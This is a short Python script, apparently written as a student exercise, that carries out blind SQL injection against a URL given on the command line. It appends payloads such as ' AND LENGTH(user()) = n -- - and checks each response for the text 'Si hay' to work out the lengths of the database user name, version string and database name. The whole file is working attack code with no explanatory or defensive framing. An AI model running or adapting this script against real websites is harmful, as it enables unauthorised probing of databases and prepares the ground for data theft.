#!/usr/bin/python
#Ceron Rodriguez Lezly Dialid

import requests
import sys

header = {'User-Agent':'Mozilla/5.0'} 

i=1
user=0
version=0
database=0
while user == 0:
	url=sys.argv[1]+"' AND LENGTH(user()) = " +str(i) +" -- -v" 
	response = requests.get(url,headers=header) 
	if "Si hay" in response.text:
		print("Tamanio de usuario: " + str(i))
		user=i
	i= i+1
i=1
while version == 0:
	url=sys.argv[1]+"' AND LENGTH(@@version) = " +str(i) +" -- -v" 
	response = requests.get(url,headers=header) 
	if "Si hay" in response.text:
		print("Tamanio de version: " + str(i))
		version=i
	i= i+1
i=1
while database == 0:
	url=sys.argv[1]+"' AND LENGTH(database()) = " +str(i) +" -- -v" 
	response = requests.get(url,headers=header) 
	if "Si hay" in response.text:
		print("Tamanio de database: " + str(i))
		database=i
	i= i+1